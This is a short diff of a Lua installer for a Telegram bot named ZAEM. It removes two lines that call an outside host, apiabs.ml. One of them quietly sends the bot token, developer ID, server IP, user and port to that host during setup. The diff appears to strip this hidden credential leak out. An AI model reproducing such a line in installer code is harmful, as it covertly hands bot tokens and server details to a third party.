@@ -19,7 +19,6 @@ if not DevRio:get(Server.."IdZAEM") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://apiabs.ml/Api/ZAEM/index.php?Ban=ZAEM&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -71,7 +70,6 @@ ZAEM = DevRio:get(Server.."TokenZAEM"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdZAEM")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/ZAEM/index.php?Get=ZAEM&DevId="..DevRio:get(Server.."IdZAEM").."&TokenBot="..DevRio:get(Server.."TokenZAEM").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("ZAEM.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
